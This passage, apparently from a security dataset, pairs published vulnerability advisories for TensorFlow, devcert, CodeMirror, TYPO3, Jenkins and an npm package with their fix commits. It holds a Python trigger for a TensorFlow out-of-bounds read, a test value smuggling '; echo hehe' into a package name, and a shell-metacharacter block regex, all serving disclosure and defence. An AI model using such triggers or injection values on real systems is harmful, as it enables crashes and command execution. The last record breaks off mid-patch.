`tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:\n\n```python\nimport tensorflow as tf\n\nt = tf.constant([1], shape=[1, 1, 1, 1], dtype=tf.quint8)\nt_min = tf.constant([], shape=[0], dtype=tf.float32)\nt_max = tf.constant([], shape=[0], dtype=tf.float32)\nm = tf.constant([1], shape=[1], dtype=tf.quint8)\nm_min = tf.constant([], shape=[0], dtype=tf.float32)\nm_max = tf.constant([], shape=[0], dtype=tf.float32)\nv = tf.constant([1], shape=[1], dtype=tf.quint8)\nv_min = tf.constant([], shape=[0], dtype=tf.float32)\nv_max = tf.constant([], shape=[0], dtype=tf.float32)\nbeta = tf.constant([1], shape=[1], dtype=tf.quint8)\nbeta_min = tf.constant([], shape=[0], dtype=tf.float32)\nbeta_max = tf.constant([], shape=[0], dtype=tf.float32)\ngamma = tf.constant([1], shape=[1], dtype=tf.quint8)\ngamma_min = tf.constant([], shape=[0], dtype=tf.float32)\ngamma_max = tf.constant([], shape=[0], dtype=tf.float32) \n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  variance_epsilon=0.1, scale_after_normalization=True)\n```                         \n                            \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f\/tensorflow\/core\/kernels\/quantized_batch_norm_op.cc#L176-L189) assumes the inputs are not empty: \n  \n```cc\nconst float input_min = context->input(1).flat<float>()(0);\nconst float input_max = context->input(2).flat<float>()(0);\n...\nconst float mean_min = context->input(4).flat<float>()(0);\nconst float mean_max = context->input(5).flat<float>()(0);\n...\nconst float var_min = context->input(7).flat<float>()(0);\nconst float var_max = context->input(8).flat<float>()(0);\n...\nconst float beta_min = context->input(10).flat<float>()(0);\nconst float beta_max = context->input(11).flat<float>()(0);\n...\nconst float gamma_min = context->input(13).flat<float>()(0);\nconst float gamma_max = context->input(14).flat<float>()(0);\n```\n\nIf any of these inputs is empty, `.flat<T>()` is an empty buffer, so accessing the element at index 0 is accessing data outside of bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b","commit_sha":"d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b","patch":"SINGLE","chain_ord":"['d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b']","before_first_fix_commit":"{'55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f'}","last_fix_commit":"d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b","chain_ord_pos":1.0,"commit_datetime":"04\/23\/2021, 18:40:06","message":"Add missing validation in `QuantizedBatchNormWithGlobalNormalization`\n\nPiperOrigin-RevId: 370123451\nChange-Id: Id234d6dab1ec21230bb8e503dba30f899af87f33","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 67, 'deletions': 10, 'total': 77}","files":"{'tensorflow\/core\/kernels\/quantized_batch_norm_op.cc': {'additions': 67, 'deletions': 10, 'changes': 77, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b\/tensorflow%2Fcore%2Fkernels%2Fquantized_batch_norm_op.cc', 'patch': '@@ -173,20 +173,50 @@ class QuantizedBatchNormOp : public OpKernel {\\n \\n   void Compute(OpKernelContext* context) override {\\n     const Tensor& input = context->input(0);\\n-    const float input_min = context->input(1).flat<float>()(0);\\n-    const float input_max = context->input(2).flat<float>()(0);\\n+    const auto& input_min_tensor = context->input(1);\\n+    OP_REQUIRES(context, input_min_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"input_min must have 1 element\"));\\n+    const float input_min = input_min_tensor.flat<float>()(0);\\n+    const auto& input_max_tensor = context->input(2);\\n+    OP_REQUIRES(context, input_max_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"input_max must have 1 element\"));\\n+    const float input_max = input_max_tensor.flat<float>()(0);\\n     const Tensor& mean = context->input(3);\\n-    const float mean_min = context->input(4).flat<float>()(0);\\n-    const float mean_max = context->input(5).flat<float>()(0);\\n+    const auto& mean_min_tensor = context->input(4);\\n+    OP_REQUIRES(context, mean_min_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"mean_min must have 1 element\"));\\n+    const float mean_min = mean_min_tensor.flat<float>()(0);\\n+    const auto& mean_max_tensor = context->input(5);\\n+    OP_REQUIRES(context, mean_max_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"mean_max must have 1 element\"));\\n+    const float mean_max = mean_max_tensor.flat<float>()(0);\\n     const Tensor& var = context->input(6);\\n-    const float var_min = context->input(7).flat<float>()(0);\\n-    const float var_max = context->input(8).flat<float>()(0);\\n+    const auto& var_min_tensor = context->input(7);\\n+    OP_REQUIRES(context, var_min_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"var_min must have 1 element\"));\\n+    const float var_min = var_min_tensor.flat<float>()(0);\\n+    const auto& var_max_tensor = context->input(8);\\n+    OP_REQUIRES(context, var_max_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"var_max must have 1 element\"));\\n+    const float var_max = var_max_tensor.flat<float>()(0);\\n     const Tensor& beta = context->input(9);\\n-    const float beta_min = context->input(10).flat<float>()(0);\\n-    const float beta_max = context->input(11).flat<float>()(0);\\n+    const auto& beta_min_tensor = context->input(10);\\n+    OP_REQUIRES(context, beta_min_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"beta_min must have 1 element\"));\\n+    const float beta_min = beta_min_tensor.flat<float>()(0);\\n+    const auto& beta_max_tensor = context->input(11);\\n+    OP_REQUIRES(context, beta_max_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"beta_max must have 1 element\"));\\n+    const float beta_max = beta_max_tensor.flat<float>()(0);\\n     const Tensor& gamma = context->input(12);\\n-    const float gamma_min = context->input(13).flat<float>()(0);\\n-    const float gamma_max = context->input(14).flat<float>()(0);\\n+    const auto& gamma_min_tensor = context->input(13);\\n+    OP_REQUIRES(context, gamma_min_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"gamma_min must have 1 element\"));\\n+    const float gamma_min = gamma_min_tensor.flat<float>()(0);\\n+    const auto& gamma_max_tensor = context->input(14);\\n+    OP_REQUIRES(context, gamma_max_tensor.NumElements() == 1,\\n+                errors::InvalidArgument(\"gamma_max must have 1 element\"));\\n+    const float gamma_max = gamma_max_tensor.flat<float>()(0);\\n \\n     OP_REQUIRES(context, input.dims() == 4,\\n                 errors::InvalidArgument(\"input must be 4-dimensional\",\\n@@ -203,6 +233,33 @@ class QuantizedBatchNormOp : public OpKernel {\\n     OP_REQUIRES(context, gamma.dims() == 1,\\n                 errors::InvalidArgument(\"gamma must be 1-dimensional\",\\n                                         gamma.shape().DebugString()));\\n+    OP_REQUIRES(context, mean.NumElements() > 1,\\n+                errors::InvalidArgument(\"Must have at least a mean value\",\\n+                                        gamma.shape().DebugString()));\\n+    OP_REQUIRES(context, mean.NumElements() > 1,\\n+                errors::InvalidArgument(\"Must have at least a mean value\"));\\n+    const auto last_dim = input.shape().dims() - 1;\\n+    OP_REQUIRES(context,\\n+                mean.shape().dim_size(0) == input.shape().dim_size(last_dim),\\n+                errors::InvalidArgument(\"Must provide as many means as the \"\\n+                                        \"last dimension of the input tensor: \",\\n+                                        mean.shape().DebugString(), \" vs. \",\\n+                                        input.shape().DebugString()));\\n+    OP_REQUIRES(\\n+        context, mean.shape().dim_size(0) == var.shape().dim_size(0),\\n+        errors::InvalidArgument(\\n+            \"Mean and variance tensors must have the same shape: \",\\n+            mean.shape().DebugString(), \" vs. \", var.shape().DebugString()));\\n+    OP_REQUIRES(\\n+        context, mean.shape().dim_size(0) == beta.shape().dim_size(0),\\n+        errors::InvalidArgument(\\n+            \"Mean and beta tensors must have the same shape: \",\\n+            mean.shape().DebugString(), \" vs. \", beta.shape().DebugString()));\\n+    OP_REQUIRES(\\n+        context, mean.shape().dim_size(0) == gamma.shape().dim_size(0),\\n+        errors::InvalidArgument(\\n+            \"Mean and gamma tensors must have the same shape: \",\\n+            mean.shape().DebugString(), \" vs. \", gamma.shape().DebugString()));\\n \\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(context,'}}","message_norm":"add missing validation in `quantizedbatchnormwithglobalnormalization`\n\npiperorigin-revid: 370123451\nchange-id: id234d6dab1ec21230bb8e503dba30f899af87f33","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('370123451', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_batch_norm_op.cc'])","num_files":1.0},{"index":422,"vuln_id":"GHSA-4gp3-p7ph-x2jr","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/guybedford\/devcert\/commit\/571f4e6d077f7f21c6aed655ae380d85a7a5d3b8'}","dataset":"osv","summary":"OS Command Injection in devcert-sanscache devcert-sanscache before 0.4.7 allows remote attackers to execute arbitrary code or cause a Command Injection via the exec function. The variable `commonName` controlled by user input is used as part of the `exec` function without any sanitization.","published_date":"2020-04-14","chain_len":1,"project":"https:\/\/github.com\/guybedford\/devcert","commit_href":"https:\/\/github.com\/guybedford\/devcert\/commit\/571f4e6d077f7f21c6aed655ae380d85a7a5d3b8","commit_sha":"571f4e6d077f7f21c6aed655ae380d85a7a5d3b8","patch":"SINGLE","chain_ord":"['571f4e6d077f7f21c6aed655ae380d85a7a5d3b8']","before_first_fix_commit":"{'651bb8ebb97a029be13656c0476d48db85887451'}","last_fix_commit":"571f4e6d077f7f21c6aed655ae380d85a7a5d3b8","chain_ord_pos":1.0,"commit_datetime":"01\/08\/2020, 01:35:58","message":"common name sanitization","author":"Guy Bedford","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/index.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/guybedford\/devcert\/raw\/571f4e6d077f7f21c6aed655ae380d85a7a5d3b8\/src%2Findex.ts', 'patch': \"@@ -6,7 +6,7 @@ import fs = require('fs');\\n export default async function generateDevCert (commonName: string) {\\n   if (!commandExists.sync('openssl'))\\n     throw new Error('Unable to find openssl - make sure it is installed and available in your PATH');\\n-  if (!commonName.match(\/^(.|\\\\.){1,64}$\/))\\n+  if (!commonName.match(\/^(a-zA-Z0-9|\\\\.){1,64}$\/))\\n     throw new Error(`Invalid Common Name ${commonName}.`);\\n   try {\\n     const opensslConfPath = generateOpensslConf(commonName);\"}}","message_norm":"common name sanitization","language":"it","entities":"[('sanitization', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/index.ts'])","num_files":1.0},{"index":425,"vuln_id":"GHSA-4gw3-8f77-f72c","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/codemirror\/CodeMirror\/commit\/55d0333907117c9231ffdf555ae8824705993bbb'}","dataset":"osv","summary":"Regular expression denial of service in codemirror This affects the package codemirror before 5.58.2; the package org.apache.marmotta.webjars:codemirror before 5.58.2.\n The vulnerable regular expression is located in https:\/\/github.com\/codemirror\/CodeMirror\/blob\/cdb228ac736369c685865b122b736cd0d397836c\/mode\/javascript\/javascript.jsL129. The ReDOS vulnerability of the regex is mainly due to the sub-pattern (s|\/*.*?*\/)*","published_date":"2021-05-10","chain_len":1,"project":"https:\/\/github.com\/codemirror\/CodeMirror","commit_href":"https:\/\/github.com\/codemirror\/CodeMirror\/commit\/55d0333907117c9231ffdf555ae8824705993bbb","commit_sha":"55d0333907117c9231ffdf555ae8824705993bbb","patch":"SINGLE","chain_ord":"['55d0333907117c9231ffdf555ae8824705993bbb']","before_first_fix_commit":"{'cdb228ac736369c685865b122b736cd0d397836c'}","last_fix_commit":"55d0333907117c9231ffdf555ae8824705993bbb","chain_ord_pos":1.0,"commit_datetime":"10\/09\/2020, 13:38:39","message":"[javascript mode] Fix potentially-exponential regexp","author":"Marijn Haverbeke","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'mode\/javascript\/javascript.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/codemirror\/codemirror5\/raw\/55d0333907117c9231ffdf555ae8824705993bbb\/mode%2Fjavascript%2Fjavascript.js', 'patch': '@@ -126,7 +126,7 @@ CodeMirror.defineMode(\"javascript\", function(config, parserConfig) {\\n           var kw = keywords[word]\\n           return ret(kw.type, kw.style, word)\\n         }\\n-        if (word == \"async\" && stream.match(\/^(\\\\s|\\\\\/\\\\*.*?\\\\*\\\\\/)*[\\\\[\\\\(\\\\w]\/, false))\\n+        if (word == \"async\" && stream.match(\/^(\\\\s|\\\\\/\\\\*([^*]|\\\\*(?!\\\\\/))*?\\\\*\\\\\/)*[\\\\[\\\\(\\\\w]\/, false))\\n           return ret(\"async\", \"keyword\", word)\\n       }\\n       return ret(\"variable\", \"variable\", word)'}}","message_norm":"[javascript mode] fix potentially-exponential regexp","language":"ca","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['mode\/javascript\/javascript.js'])","num_files":1.0},{"index":427,"vuln_id":"GHSA-4h44-w6fm-548g","cwe_id":"{'CWE-325', 'CWE-200', 'CWE-502', 'CWE-20'}","score":9.8,"chain":"{'https:\/\/github.com\/FriendsOfTYPO3\/mediace\/commit\/fa29ffd3e8b275782a8600d2406e1b1e5e16ae75'}","dataset":"osv","summary":"Potential Remote Code Execution in TYPO3 with mediace extension > ### Meta\n> * CVSS: `CVSS:3.1\/AV:N\/AC:L\/PR:N\/UI:N\/S:U\/C:H\/I:H\/A:H\/E:F\/RL:O\/RC:C` (9.1)\n> * CWE-325, CWE-20, CWE-200, CWE-502\n\n### Problem\nIt has been discovered that an internal verification mechanism can be used to generate arbitrary checksums. This allows to inject arbitrary data having a valid cryptographic message authentication code (HMAC-SHA1) and can lead to various attack chains as described below.\n\n* [TYPO3-CORE-SA-2020-007](https:\/\/typo3.org\/security\/advisory\/typo3-core-sa-2020-007), [CVE-2020-15099](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2020-15099): Potential Privilege Escalation\n  + the database server used for a TYPO3 installation must be accessible for an attacker (either via internet or shared hosting network)\n  + `CVSS:3.1\/AV:N\/AC:H\/PR:N\/UI:N\/S:U\/C:H\/I:H\/A:H\/E:F\/RL:O\/RC:C` (7.5, high)\n* [TYPO3-CORE-SA-2016-013](https:\/\/typo3.org\/security\/advisory\/typo3-core-sa-2016-013), [CVE-2016-5091](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2016-5091): Insecure Deserialization & Remote Code Execution\n  + an attacker must have access to at least one Extbase plugin or module action in a TYPO3 installation\n  + `CVSS:3.1\/AV:N\/AC:L\/PR:N\/UI:N\/S:U\/C:H\/I:H\/A:H\/E:F\/RL:O\/RC:C` (9.1, critical)\n\nThe overall severity of this vulnerability is critical (9.1) based on mentioned attack chains and the fact it does not require any privileges.\n\n### Solution\nIn case the extension is not used and required at all, it is suggested to uninstall and remove it from the system completely. Otherwise, an updated version 7.6.5 is available from the TYPO3 extension manager, Packagist and the TYPO3 extension repository:\n\n* https:\/\/extensions.typo3.org\/extension\/download\/mediace\/7.6.5\/zip\/\n* https:\/\/packagist.org\/packages\/friendsoftypo3\/mediace#7.6.5\n\nAs a precautionary measure it is advised to change `encryptionKey` and database credentials in `typo3conf\/LocalConfiguration.php`.\n\n### Credits\nThanks to TYPO3 security team member Oliver Hader who reported and fixed the issue.\n\n### References\n* [TYPO3-EXT-SA-2020-014](https:\/\/typo3.org\/security\/advisory\/typo3-ext-sa-2020-014)","published_date":"2020-07-29","chain_len":1,"project":"https:\/\/github.com\/FriendsOfTYPO3\/mediace","commit_href":"https:\/\/github.com\/FriendsOfTYPO3\/mediace\/commit\/fa29ffd3e8b275782a8600d2406e1b1e5e16ae75","commit_sha":"fa29ffd3e8b275782a8600d2406e1b1e5e16ae75","patch":"SINGLE","chain_ord":"['fa29ffd3e8b275782a8600d2406e1b1e5e16ae75']","before_first_fix_commit":"{'a06c3fdf310ea4d53e193f21a23e630a3cd9f608'}","last_fix_commit":"fa29ffd3e8b275782a8600d2406e1b1e5e16ae75","chain_ord_pos":1.0,"commit_datetime":"06\/29\/2020, 13:39:55","message":"[SECURITY] Restrict file validation hash generation\n\nSecurity-References: CVE-2020-15086","author":"Oliver Hader","comments":null,"stats":"{'additions': 7, 'deletions': 2, 'total': 9}","files":"{'Resources\/PHP\/ValidateHashEID.php': {'additions': 7, 'deletions': 2, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FriendsOfTYPO3\/mediace\/raw\/fa29ffd3e8b275782a8600d2406e1b1e5e16ae75\/Resources%2FPHP%2FValidateHashEID.php', 'patch': \"@@ -14,10 +14,15 @@\\n \\n call_user_func(function() {\\n     $value = \\\\TYPO3\\\\CMS\\\\Core\\\\Utility\\\\GeneralUtility::_GET('value');\\n-    $addition = \\\\TYPO3\\\\CMS\\\\Core\\\\Utility\\\\GeneralUtility::_GET('addition');\\n     $scope = \\\\TYPO3\\\\CMS\\\\Core\\\\Utility\\\\GeneralUtility::_GET('scope');\\n \\n-    $content = \\\\TYPO3\\\\CMS\\\\Core\\\\Utility\\\\GeneralUtility::hmac($value, $addition);\\n+    if (!is_string($value) || empty($value)) {\\n+        \\\\TYPO3\\\\CMS\\\\Core\\\\Utility\\\\HttpUtility::setResponseCodeAndExit(\\n+            \\\\TYPO3\\\\CMS\\\\Core\\\\Utility\\\\HttpUtility::HTTP_STATUS_400\\n+        );\\n+    }\\n+\\n+    $content = \\\\TYPO3\\\\CMS\\\\Core\\\\Utility\\\\GeneralUtility::hmac($value, 'flashvars');\\n \\n     if ($scope === 'flashvars') {\\n         header('Content-type: application\/x-www-form-urlencoded');\"}}","message_norm":"[security] restrict file validation hash generation\n\nsecurity-references: cve-2020-15086","language":"en","entities":"[('security', 'SECWORD', ''), ('hash', 'SECWORD', ''), ('security', 'SECWORD', ''), ('cve-2020-15086', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Resources\/PHP\/ValidateHashEID.php'])","num_files":1.0},{"index":428,"vuln_id":"GHSA-4h47-h3cr-23wh","cwe_id":"{'CWE-285'}","score":6.5,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/01157a699f611ca7492e872103ac01526a982cf2'}","dataset":"osv","summary":"Improper Authorization in Jenkins A denial of service vulnerability exists in Jenkins 2.145 and earlier, LTS 2.138.1 and earlier in core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java that allows attackers without Overall\/Read permission to access a specific URL on instances using the built-in Jenkins user database security realm that results in the creation of an ephemeral user record in memory.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/01157a699f611ca7492e872103ac01526a982cf2","commit_sha":"01157a699f611ca7492e872103ac01526a982cf2","patch":"SINGLE","chain_ord":"['01157a699f611ca7492e872103ac01526a982cf2']","before_first_fix_commit":"{'df87e12ddcfeafdba6e0de0e07b3e21f8473ece6'}","last_fix_commit":"01157a699f611ca7492e872103ac01526a982cf2","chain_ord_pos":1.0,"commit_datetime":"09\/27\/2018, 09:18:42","message":"[SECURITY-1128]","author":"Daniel Beck","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/01157a699f611ca7492e872103ac01526a982cf2\/core%2Fsrc%2Fmain%2Fjava%2Fhudson%2Fsecurity%2FHudsonPrivateSecurityRealm.java', 'patch': '@@ -475,8 +475,9 @@ public List<User> getAllUsers() {\\n      * This is to map users under the security realm URL.\\n      * This in turn helps us set up the right navigation breadcrumb.\\n      *\/\\n+    @Restricted(NoExternalUse.class)\\n     public User getUser(String id) {\\n-        return User.getById(id, true);\\n+        return User.getById(id, User.ALLOW_USER_CREATION_VIA_URL && hasPermission(Jenkins.ADMINISTER));\\n     }\\n \\n     \/\/ TODO'}}","message_norm":"[security-1128]","language":"en","entities":"[('security-1128', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java'])","num_files":1.0},{"index":429,"vuln_id":"GHSA-4h66-vghf-xg5x","cwe_id":"{'CWE-77'}","score":9.8,"chain":"{'https:\/\/github.com\/hoperyy\/get-npm-package-version\/commit\/49459d4a3ce68587d48ffa8dead86fc9ed58e965', 'https:\/\/github.com\/hoperyy\/get-npm-package-version\/commit\/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec'}","dataset":"osv","summary":"get-npm-package-version Command Injection vulnerability The package get-npm-package-version before 1.0.7 is vulnerable to Command Injection via the `main` function in index.js.","published_date":"2022-08-03","chain_len":2,"project":"https:\/\/github.com\/hoperyy\/get-npm-package-version","commit_href":"https:\/\/github.com\/hoperyy\/get-npm-package-version\/commit\/49459d4a3ce68587d48ffa8dead86fc9ed58e965","commit_sha":"49459d4a3ce68587d48ffa8dead86fc9ed58e965","patch":"MULTI","chain_ord":"['40b1cf31a0607ea66f9e30a0c3af1383b52b2dec', '49459d4a3ce68587d48ffa8dead86fc9ed58e965']","before_first_fix_commit":"{'52797864df09049ea28d65d14620774257a965b0'}","last_fix_commit":"49459d4a3ce68587d48ffa8dead86fc9ed58e965","chain_ord_pos":2.0,"commit_datetime":"01\/26\/2021, 03:55:57","message":"feat: add test case for Command Injection Attack\n\nadd test case for  Command Injection Attack","author":"DuLinRain","comments":null,"stats":"{'additions': 9, 'deletions': 1, 'total': 10}","files":"{'test\/index.test.js': {'additions': 9, 'deletions': 1, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hoperyy\/get-npm-package-version\/raw\/49459d4a3ce68587d48ffa8dead86fc9ed58e965\/test%2Findex.test.js', 'patch': \"@@ -16,4 +16,12 @@ describe('test webpack and webpackxxx', () => {\\n         });\\n         expect(version).to.be.equal(null);\\n     }).timeout(10 * 1000);\\n-});\\n\\\\ No newline at end of file\\n+\\n+    \/\/ test defence attack\\n+    it('test defence Command Injection Attack', () => {\\n+        const version = getVersion('get-npm-package-version; echo hehe; npm view get-npm-package-version', {\\n+            timeout: 100\\n+        });\\n+        expect(version).to.be.equal(null);\\n+    }).timeout(10 * 1000);\\n+});\"}}","message_norm":"feat: add test case for command injection attack\n\nadd test case for  command injection attack","language":"en","entities":"[('add', 'ACTION', ''), ('command injection', 'SECWORD', ''), ('attack', 'FLAW', ''), ('add', 'ACTION', ''), ('command injection', 'SECWORD', ''), ('attack', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['test\/index.test.js'])","num_files":1.0},{"index":430,"vuln_id":"GHSA-4h66-vghf-xg5x","cwe_id":"{'CWE-77'}","score":9.8,"chain":"{'https:\/\/github.com\/hoperyy\/get-npm-package-version\/commit\/49459d4a3ce68587d48ffa8dead86fc9ed58e965', 'https:\/\/github.com\/hoperyy\/get-npm-package-version\/commit\/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec'}","dataset":"osv","summary":"get-npm-package-version Command Injection vulnerability The package get-npm-package-version before 1.0.7 is vulnerable to Command Injection via the `main` function in index.js.","published_date":"2022-08-03","chain_len":2,"project":"https:\/\/github.com\/hoperyy\/get-npm-package-version","commit_href":"https:\/\/github.com\/hoperyy\/get-npm-package-version\/commit\/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec","commit_sha":"40b1cf31a0607ea66f9e30a0c3af1383b52b2dec","patch":"MULTI","chain_ord":"['40b1cf31a0607ea66f9e30a0c3af1383b52b2dec', '49459d4a3ce68587d48ffa8dead86fc9ed58e965']","before_first_fix_commit":"{'52797864df09049ea28d65d14620774257a965b0'}","last_fix_commit":"49459d4a3ce68587d48ffa8dead86fc9ed58e965","chain_ord_pos":1.0,"commit_datetime":"01\/26\/2021, 03:48:05","message":"feat: add defence to Command Injection\n\nadd defence to Command Injection","author":"DuLinRain","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'index.js': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hoperyy\/get-npm-package-version\/raw\/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec\/index.js', 'patch': \"@@ -1,5 +1,8 @@\\n module.exports = function (packageName, { registry = '', timeout = null } = {}) {\\n     try {\\n+        if (\/[`$&{}[;|]\/g.test(packageName) || \/[`$&{}[;|]\/g.test(registry)) {\\n+            return null\\n+        }\\n         let version;\\n \\n         const config = {\"}}","message_norm":"feat: add defence to command injection\n\nadd defence to command injection","language":"en","entities":"[('add', 'ACTION', ''), ('defence', 'SECWORD', ''), ('command injection', 'SECWORD', ''), ('add', 'ACTION', ''), ('defence', 'SECWORD', ''), ('command injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":436,"vuln_id":"GHSA-4hvf-hxvg-f67v","cwe_id":"{'CWE-787', 'CWE-125'}","score":8.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6364463d6f5b6254cac3d6aedf999b6a96225038'}","dataset":"osv","summary":"Read and Write outside of bounds in TensorFlow ### Impact\nAn attacker can craft a TFLite model that would allow limited reads and writes outside of arrays in TFLite. This exploits missing validation in [the conversion from sparse tensors to dense tensors](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ca6f96b62ad84207fbec580404eaa7dd7403a550\/tensorflow\/lite\/kernels\/internal\/utils\/sparsity_format_converter.cc#L252-L293).\n\n### Patches\nWe have patched the issue in GitHub commit [6364463d6f5b6254cac3d6aedf999b6a96225038](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6364463d6f5b6254cac3d6aedf999b6a96225038).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6364463d6f5b6254cac3d6aedf999b6a96225038","commit_sha":"6364463d6f5b6254cac3d6aedf999b6a96225038","patch":"SINGLE","chain_ord":"['6364463d6f5b6254cac3d6aedf999b6a96225038']","before_first_fix_commit":"{'3e49ff637ad4f05c133d235a568943d19216fa9a'}","last_fix_commit":"6364463d6f5b6254cac3d6aedf999b6a96225038","chain_ord_pos":1.0,"commit_datetime":"12\/16\/2021, 23:37:14","message":"[lite] Add some safety checks to avoid out of bound access for sparsity format\n\nPiperOrigin-RevId: 416910386\nChange-Id: Ic0b4dc048dc4b5a6309c572b8c4c9f776e4db60a","author":"Karim Nosir","comments":null,"stats":"{'additions': 11, 'deletions': 7, 'total': 18}","files":"{'tensorflow\/lite\/kernels\/internal\/utils\/sparsity_format_converter.cc': {'additions': 11, 'deletions': 7, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6364463d6f5b6254cac3d6aedf999b6a96225038\/tensorflow%2Flite%2Fkernels%2Finternal%2Futils%2Fsparsity_format_converter.cc', 'patch': '@@ -282,10 +282,12 @@ void FormatConverter<T>::InitSparseToDenseConverter(\\n   block_size_.resize(block_map_.size());\\n   for (int i = 0; i < original_rank; i++) {\\n     if (block_dim < block_map_.size() && block_map_[block_dim] == i) {\\n-      int orig_dim = traversal_order_[original_rank + block_dim];\\n-      block_size_[block_dim] = dense_size[orig_dim];\\n-      blocked_shape_[i] = dense_shape_[i] \/ dense_size[orig_dim];\\n-      block_dim++;\\n+      if (original_rank + block_dim < traversal_order_.size()) {\\n+        int orig_dim = traversal_order_[original_rank + block_dim];\\n+        block_size_[block_dim] = dense_size[orig_dim];\\n+        blocked_shape_[i] = dense_shape_[i] \/ dense_size[orig_dim];\\n+        block_dim++;\\n+      }\\n     } else {\\n       blocked_shape_[i] = dense_shape_[i];\\n     }\\n@@ -328,13 +330,15 @@ void FormatConverter<T>::Populate(const T* src_data, 